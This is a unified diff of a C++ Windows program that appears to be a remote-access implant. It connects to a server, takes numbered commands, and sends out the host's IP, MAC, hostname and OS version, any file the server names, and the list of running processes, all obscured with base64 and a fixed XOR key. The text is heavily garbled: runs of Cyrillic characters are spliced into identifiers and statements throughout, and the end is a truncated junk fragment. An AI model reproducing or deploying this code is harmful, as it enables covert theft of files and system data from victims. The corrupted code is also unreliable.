@@ -47,7 +47,7 @@ static inline bool is_base64(unsigned char c) {
 }
 
 std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
-    std::string ret;
+    std::string ret = "";
     int i = 0;
     int j = 0;
     unsigned char char_array_3[3];
@@ -56,7 +56,7 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
     while (in_len--) {
         char_array_3[i++] = *(bytes_to_encode++);
         if (i == 3) {
-            char_array_4[0] = (charлллллллллллллллллллл_array_3[0] & 0xfc) >> 2;
+            char_array_4[0] = лллллллллллллллллллл(char_array_3[0] & 0xfc) >> 2;
             char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
             char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
             char_array_4[3] = char_array_3[2] & 0x3f;
@@ -72,7 +72,7 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
         for (j = i; j < 3; j++)
             char_array_3[j] = '\0';
 
-       лллллллллллллллллллл char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+  лллллллллллллллллллл      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
         char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
         char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
         char_array_4[3] = char_array_3[2] & 0x3f;
@@ -89,7 +89,7 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
 
 }
 
-std::string base64_decode(std::string conллллллллллллллллллллst& encoded_string) {
+std::string base64_decode(std::strinллллллллллллллллллллg const& encoded_string) {
     int in_len = encoded_string.size();
     int i = 0;
     int j = 0;
@@ -103,7 +103,7 @@ std::string base64_decode(std::string conллллллллллллллллллллst& encoded_string)
             for (i = 0; i < 4; i++)
                 char_array_4[i] = base64_chars.find(char_array_4[i]);
 
-            char_array_3[0] = (char_arrayлллллллллллллллллллл_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[0] = (char_ллллллллллллллллллллarray_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
             char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
             char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
 
@@ -118,7 +118,7 @@ std::string base64_decode(std::string conллллллллллллллллллллst& encoded_string)
             char_array_4[j] = 0;
 
         for (j = 0; j < 4; j++)
-            char_array_4[j] = base64_chars.find(ллллллллллллллллллллchar_array_4[j]);
+            char_array_4[j] = base64_chars.ллллллллллллллллллллfind(char_array_4[j]);
 
         char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
         char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
@@ -134,7 +134,7 @@ std::string XOR(std::string value, std::string key)
 {
     std::string retval(value);
     long unsigned int klen = key.length();
-    longлллллллллллллллллллл unsigned int vlen = value.length();
+   лллллллллллллллллллл long unsigned int vlen = value.length();
     unsigned long int k = 0;
     unsigned long int v = 0;
     for (; v < vlen; v++) {
@@ -156,7 +156,7 @@ tuple1 getMAC()
     DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
     char *mac_addr = (char *)malloc(18);
     char *ipAddress = (char *)malloc(15);
-    tuple1 returnValueллллллллллллллллллллs = {NULL, NULL};
+    tuple1 returnллллллллллллллллллллValues = {NULL, NULL};
 
     AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
     if (AdapterInfo == NULL)
@@ -169,7 +169,7 @@ tuple1 getMAC()
     // Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
     if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW)
     {
-        free(AdapterInfo);лллллллллллллллллллл
+        free(AdapterIллллллллллллллллллллnfo);
         AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
         if (AdapterInfo == NULL)
         {
@@ -183,7 +183,7 @@ tuple1 getMAC()
     {
         // Contains pointer to current adapter info
         PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
-            // technically should look at pAdapterInfo->AddressLeллллллллллллллллллллngth
+            // technically should look at pAdapterInfo->AddrллллллллллллллллллллessLength
             //   and not assume it is 6.
         sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
         pAdapterInfo->Address[0], pAdapterInfo->Address[1],
@@ -192,7 +192,7 @@ tuple1 getMAC()
         //printf("Address: %s, mac: %s\n", pAdapterInfo->IpAddressList.IpAddress.String, mac_addr);
 
             //pulls IPs
-        memcpy(ipAddress, pAdapterInfo->IpAddressList.IpAddress.String, strlen(ipAddress));лллллллллллллллллллл
+        memcpy(ipAddress, pAdapterInfo->IpAddressList.IpAddress.String, strlen(ipAddresллллллллллллллллллллs));
         //printf("Address: %s, mac: %s\n", ipAddress, mac_addr);
 
             // print them all, return the last one.
@@ -214,7 +214,7 @@ string PrintProcessNameAndID(DWORD processID)
 {
     TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
 
-    // Get a handle toлллллллллллллллллллл the process.
+    // Get a handллллллллллллллллллллle to the process.
 
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                       PROCESS_VM_READ,
@@ -231,7 +231,7 @@ string PrintProcessNameAndID(DWORD processID)
                                &cbNeeded))
         {
             GetModuleBaseName(hProcess, hMod, szProcessName,
-                        лллллллллллллллллллл      sizeof(szProcessName) / sizeof(TCHAR));
+                   лллллллллллллллллллл           sizeof(szProcessName) / sizeof(TCHAR));
         }
     }
 
@@ -256,9 +256,9 @@ string convertToString(char* a)
 
 std::string decryption(char* cipher, int size)
 {
-    string deллллллллллллллллллллcrypted;
+    striллллллллллллллллллллng decrypted = "";
     string q = ":&";
-    string decryptedString;
+    string decryptedString = "";
     decrypted = XOR(cipher, q);
     char* decrypt = new char[strlen(decrypted.c_str())];
     //decryptedString = decrypted; //.substr(0, decrypted.find("=")) + "=";
@@ -271,7 +271,7 @@ std::string encryption(char* cipher, int size)
 {
     string encrypted = base64_encode((unsigned char*)cipher, strlen(cipher));
     string q = ":&";
-    encrypted = XOR(eллллллллллллллллллллncrypted, q);
+    enллллллллллллллллллллcrypted = XOR(encrypted, q);
     char* encrypt = new char[strlen(encrypted.c_str())];
     strcpy(encrypt, encrypted.c_str());
     return encrypt;
@@ -290,14 +290,14 @@ int __cdecl main(int argc, char **argv)
     //const char *sendbuf = "What if we chnage this what does it do";
     //
     //
-    //
+    //лллллллллллллллллллл
 
-    tuple1 iллллллллллллллллллллnformation = getMAC();
+    tuple1 information = getMAC();
 
-    char recvbuf[DEFAULT_BUFLEN];
-    int iResult;
+    char* recvbuf = new char[DEFAULT_BUFLEN];
+    int iResult = 0;
     int recvbuflen = DEFAULT_BUFLEN;
-    string decryptedString2;
+    string decryptedString2 = "";
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -310,9 +310,9 @@ int __cdecl main(int argc, char **argv)
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_ллллллллллллллллллллprotocol = IPPROTO_TCP;
 
-    // Reллллллллллллллллллллsolve the server address and port
+    // Resolve the server address and port
     iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
     if (iResult != 0)
     {
@@ -326,8 +326,8 @@ int __cdecl main(int argc, char **argv)
     {
 
         // Create a SOCKET for connecting to server
-        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
-              лллллллллллллллллллл                 ptr->ai_protocol);
+        ConnectSocket = socket(ptr->ai_familллллллллллллллллллллy, ptr->ai_socktype,
+                               ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET)
         {
             printf("socket failed with error: %ld\n", WSAGetLastError());
@@ -340,10 +340,10 @@ int __cdecl main(int argc, char **argv)
         if (iResult == SOCKET_ERROR)
         {
             closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
+            ConnectSocket = INVALID_SOCKET;лллллллллллллллллллл
             continue;
         }
- лллллллллллллллллллл       break;
+        break;
     }
 
     freeaddrinfo(result);
@@ -362,30 +362,29 @@ int __cdecl main(int argc, char **argv)
     while (true)
     {
         cout << "\t----------Waiting for instructions---------------" << endl;
-        char username[UNLEN + 1];
+        char* username = new char[UNLEN + 1];
         int username_len = UNLEN + 1;
-        gethostname(username, username_len);
-        iResult = recv(ConneллллллллллллллллллллctSocket, recvbuf, recvbuflen, 0);
+        gethostname(usernaллллллллллллллллллллme, username_len);
+        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
         decryptedString2 = convertToString(recvbuf);
         decryptedString2 = decryption(recvbuf, strlen(recvbuf));
         string rc = string(decryptedString2);
-        string encryptedString;
-        char encrypted_star[512];
+        string encryptedString = "0";
+        char* encrypted_star = new char[512];
         if (rc.find("1") != std::string::npos)
         {
             
             OSVERSIONINFOEX info;
             ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
-            info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-           лллллллллллллллллллл GetVersionEx((LPOSVERSIONINFO)&info);//info requires typecasting
+          лллллллллллллллллллл  info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+            GetVersionEx((LPOSVERSIONINFO)&info);//info requires typecasting
 
             printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
             information.ipAddress += '\000';
             information.macAddress += '\000';
-            cout << "Sending the information" << endl;
             cout << information.ipAddress << "..." << endl;
             encryptedString = encryption(information.ipAddress, strlen(information.ipAddress));
-            strcpy(encrypted_star, encryptedSллллллллллллллллллллtring.c_str());
+            strcpy(encrypted_star, ллллллллллллллллллллencryptedString.c_str());
             iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
             iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
             decryptedString2 = convertToString(recvbuf);
@@ -393,7 +392,7 @@ int __cdecl main(int argc, char **argv)
 
             encryptedString = encryption(information.macAddress, strlen(information.macAddress));
             strcpy(encrypted_star, encryptedString.c_str());
-            cout << information.macAddress << "..лллллллллллллллллллл." << endl;
+            cout << information.macAddrллллллллллллллллллллess << "..." << endl;
             iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
 
             cout << username << "..." << endl;
@@ -403,60 +402,65 @@ int __cdecl main(int argc, char **argv)
 
             std::ostringstream stream;
             stream << info.dwMajorVersion;
-            char string1[sizeof(info.dwMajorVersion)];
-лллллллллллллллллллл            strcpy(string1, stream.str().c_str());
+            char string1[sizeof(info.dwMajorVeллллллллллллллллллллrsion)];
+            strcpy(string1, stream.str().c_str());
 
             encryptedString = encryption(string1, strlen(string1));
             strcpy(encrypted_star, encryptedString.c_str());
             iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
             memset(recvbuf, 0, sizeof recvbuf);
-        }
+            memset(username, 0, sizeof username);
+            memset(encrypted_star, 0, sizeof encrypted_star);
+
+            cout << "Sending the information" << endl;
+        }лллллллллллллллллллл
         else if (rc.find("2") != std::string::npos)
         {
             char temp1[256];
             iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-            decrypллллллллллллллллллллtedString2 = decryption(recvbuf, strlen(recvbuf));
+            decryptedString2 = decryption(recvbuf, strlen(recvbuf));
             strcpy(temp1, decryptedString2.c_str());
             temp1[iResult] = 0;
             cout << "Server requested for file : " << temp1 << endl;
             ifstream myfile(temp1);
             if (myfile.is_open())
             {
-                strcpy(encrypted_star, "1");
+                strcpy(encrypted_sллллллллллллллллллллtar, "1");
                 encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                 strcpy(encrypted_star, encryptedString.c_str());
-                iллллллллллллллллллллResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
+                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                 myfile.close();
                 FILE *f = fopen(temp1, "rb");
                 fseek(f, 0, SEEK_END);
                 long fsize = ftell(f);
                 fseek(f, 0, SEEK_SET);
-                char *content = (char *)malloc(fsize + 1);
+                char *content = (char *)malloc(fsize + 1лллллллллллллллллллл);
                 fread(content, fsize, 1, f);
                 fclose(f);
                 iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
-                decryptedStллллллллллллллллллллring2 = decryption(recvbuf, strlen(recvbuf));
+                decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                 std::ostringstream oss;
                 oss << fsize;
                 strcpy(encrypted_star, oss.str().c_str());
                 encryptedString = encryption(encrypted_star, strlen(encrypted_star));
-                strcpy(encrypted_star, encryptedString.c_str());
+                strcpy(encrypted_star, encryptedString.c_str());лллллллллллллллллллл
                 iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                 iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
-            лллллллллллллллллллл    //decryptedString2 = decryption(recvbuf, strlen(recvbuf));
+                //decryptedString2 = decryption(recvbuf, strlen(recvbuf));
                 //encryptedString = encryption(content, strlen(content));
                 //strcpy(encrypted_star, encryptedString.c_str());
                 iResult = send(ConnectSocket, content, strlen(content), 0);
                 cout << "File sent" << endl;
-                memset(recvbuf, 0, sizeof recvbuf);
+лллллллллллллллллллл                memset(recvbuf, 0, sizeof recvbuf);
+                memset(encrypted_star, 0, sizeof encrypted_star);
             }
             else
             {
                 strcpy(encrypted_star, "2");
-                encryptedString = eллллллллллллллллллллncryption(encrypted_star, strlen(encrypted_star));
+                encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                 strcpy(encrypted_star, encryptedString.c_str());
                 iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
-                cout << "failed to open the file" << endl;
+                cout << "failed to open the file" << eллллллллллллллллллллndl;
             }
         }
         else if (rc.find("3") != std::string::npos)
@@ -465,25 +469,25 @@ int __cdecl main(int argc, char **argv)
             DWORD aProcesses[1024], cbNeeded, cProcesses;
             unsigned int i;
 
-   лллллллллллллллллллл         if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+            if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
             {
                 strcpy(encrypted_star, "2");
                 encryptedString = encryption(encrypted_star, strlen(encrypted_star));
-                strcpy(encrypted_star, encryptedString.c_str());
+                strcpy(encrypted_star, encллллллллллллллллллллryptedString.c_str());
                 iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
                 cout << "Failed to get the pocesses" << endl;
                 continue;
             }
             else
-           лллллллллллллллллллл {
+            {
                 strcpy(encrypted_star, "1");
                 encryptedString = encryption(encrypted_star, strlen(encrypted_star));
                 strcpy(encrypted_star, encryptedString.c_str());
-                iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
+                iResult = send(ConnectSocket, encrypted_starлллллллллллллллллллл, strlen(encrypted_star), 0);
                 cout << "Getting all the running processess" << endl;
             }
             iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-            decryptedString2 = decryption(recvbuf, strlen(recvbuллллллллллллллллллллf));
+            decryptedString2 = decryption(recvbuf, strlen(recvbuf));
 
             // Calculate how many process identifiers were returned.
 
@@ -491,19 +495,19 @@ int __cdecl main(int argc, char **argv)
 
             // Print the name and process identifier for each process.
             string data = "";
-            for (i = 0; i < cProcesses; i++)
+            for (i = 0; i лллллллллллллллллллл< cProcesses; i++)
             {
                 if (aProcesses[i] != 0)
                 {
                     data += PrintProcessNameAndID(aProcesses[i]);
                 }
             }
-            //iResult = send(ConnectSocket, to_stringлллллллллллллллллллл(data.length()).c_str(), strlen(to_string(data.length()).c_str()), 0);
+            //iResult = send(ConnectSocket, to_string(data.length()).c_str(), strlen(to_string(data.length()).c_str()), 0);
             //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
             string temp = "";
             int templn = recvbuflen-16;
             int ie = 0;
-            while (ie < data.length())
+            while (ie < ллллллллллллллллллллdata.length())
             {
                 if(ie+templn>data.length()){
                     temp = data.substr(ie);
@@ -511,19 +515,20 @@ int __cdecl main(int argc, char **argv)
                     temp = data.substr(ie, templn);
                 }
                 
-                iллллллллллллллллллллe += templn;
+                ie += templn;
                 // cout<<temp<<"--------------------"<<endl;
                 // cout<<ie<<"/"<<data.length()<<"--"<<strlen(data.c_str())<<endl;
                 //iResult = send(ConnectSocket, temp.c_str(), temp.length(), 0);
-                //iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+                //iReллллллллллллллллллллsult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                 memset(recvbuf, 0, sizeof recvbuf);
+                memset(encrypted_star, 0, sizeof encrypted_star);
 
             }
         }
         else if (rc.find("4") != std::string::npos)
         {
             cout << "Quiting" << endl;
-           лллллллллллллллллллл break;
+            break;
         }
         else
         {
@@ -536,7 +541,7 @@ int __cdecl main(int argc, char **argv)
     //
     //
 
-    printf("Bytes Sent: %ld\n", iResult);
+    printf("Bytes Sent: лллллллллллллллллллл%ld\n", iResult);
 
     // shutdown the connection since no more data will be sent
     iResult = shutdown(ConnectSocket, SD_SEND);
@@ -545,7 +550,7 @@ int __cdecl main(int argc, char **argv)
         printf("shutdown failed with error: %d\n", WSAGetLastError());
         closesocket(ConnectSocket);
         WSACleanup();
-        rллллллллллллллллллллeturn 1;
+        return 1;
     }
 
     // Receive until the peer closes the connection
@@ -558,13 +563,4 @@ int __cdecl main(int argc, char **argv)
 }
 мЩЩЩЩ/
 
-    printf("Bytes Sent: %ld\n", iResult);
-
-    // shutdown the connection since no more data will be sent
-    iResult = shutdown(ConnectSocket, SD_SEND);
-    if (iResult == SOCKET_ERROR)
-    {
-        printf("shutdown failed with error: %d\n", WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        rлллллллллллллллллллл
+    printf("Bytes Sent: лллллллллллллллллллл
